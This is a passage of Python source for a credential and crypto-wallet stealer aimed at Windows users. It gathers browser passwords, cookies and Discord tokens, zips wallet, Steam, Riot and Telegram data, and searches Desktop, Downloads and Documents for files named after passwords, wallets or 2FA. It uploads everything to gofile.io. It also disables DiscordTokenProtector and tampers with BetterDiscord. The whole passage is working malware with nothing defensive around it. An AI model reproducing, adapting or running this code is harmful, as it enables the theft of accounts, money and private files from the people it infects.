        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/.minecraft", '"javaw.exe"', "Minecraft"],
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Zcash", '"Zcash.exe"', "Wallet"],
        [f"{roaming}/Armory", '"Armory.exe"', "Wallet"],
        [f"{roaming}/bytecoin", '"bytecoin.exe"', "Wallet"],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb", '"Jaxx.exe"', "Wallet"],
        [f"{roaming}/Ethereum/keystore", '"Ethereum.exe"', "Wallet"],
        [f"{roaming}/Guarda/Local Storage/leveldb", '"Guarda.exe"', "Wallet"],
        [f"{roaming}/Coinomi/Coinomi/wallets", '"Coinomi.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        [f"{roaming}/Electrum/wallets", "Electrum.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam/", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"],
        [f"{roaming}/bytecoin", '"bytecoin.exe"', "Wallet"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn", "extension", "Metamask (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/fhbohimaelbohpjbbldcngcnapndodjp", "extension", "Binance (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/bfnaelmomeimhlpmgjnjophhpkkoljpa", "extension", "Phantom (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/hnfanknocfeofbddgcijnmhnfnkdnaad", "extension", "Coinbase (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/fnjhmkhhmkbjkkabndcnnogagogbneec", "extension", "Ronin (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/aholpfdialjgjfhomihkjbmgjidlcdno", "extension", "Exodus (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/aeachknmefphepccionboohckonoeemg", "extension", "Coin98 (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/pdadjkfkgcafgbceimcpbkalnfnepbnk", "extension", "KardiaChain (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/aiifbnbfobpmeekipheeijimdpnlpgpp", "extension", "TerraStation (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/amkmjjmmflddogmhpjloimipbofnfjih", "extension", "Wombat (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/fnnegphlobjdpkhecapkijjdkgcjhkib", "extension", "Harmony (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/lpfcbjknijpeeillifnkikgncikgfhdo", "extension", "Nami (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/efbglgofoippbgcjepnhiblaibcnclgk", "extension", "MartianAptos (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/jnlgamecbpmbajjfhmmmlhejkemejdma", "extension", "Braavos (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/hmeobnfnfcmdkdcmlblgagmfpfboieaf", "extension", "XDEFI (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/ffnbelfdoeiohenkjibnmadjiehjhajb", "extension", "Yoroi (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/nphplpgoakhhjchkkhmiggakijnkhfnd", "extension", "TON (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/bhghoamapcdpbohphigoooaddinpkbai", "extension", "Authenticator (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/ejbalbakoplchlghecdalmeeeajnimhm", "extension", "MetaMask_Edge (Extension)"],
        [f"{local}"+r"/Google\Chrome\User Data\Default\Extensions/ibnejdfjmmkpcnlpebklmnkoeoihofec", "extension", "Tron (Extension)"]
    ]

    profiles = [
        'Def²ault',
        'Profile 1',
        'Profile 2',
        'Profile 3',
        'Profile 4',
        'Profile 5',
    ]

    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["password.txt", "cookies.txt"]: 
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False


def byptknp():
    tp = f"{roaming}\\DiscordTokenProtector\\"
    if not ntpath.exists(tp):
        return
    config = tp + "config.json"

    for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
        try:
            os.remove(tp + i)
        except FileNotFoundError:
            pass
    if ntpath.exists(config):
        with open(config, errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['1336_is_here'] = "https://t.me/st34ler"
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420
        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)
        with open(config, 'a') as f:
            f.write("\n\n// 1336 Was Here")

def bypbd():
    bd = roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
    if ntpath.exists(bd):
        x = "api/webhooks"
        with open(bd, 'r', encoding="cp437", errors='ignore') as f:
            txt = f.read()
            content = txt.replace(x, '1336WasHere')
        with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
            f.write(content)

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    '[mail](https://gmail.com)', '[radiantcheats](https://radiantcheats.net/)', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)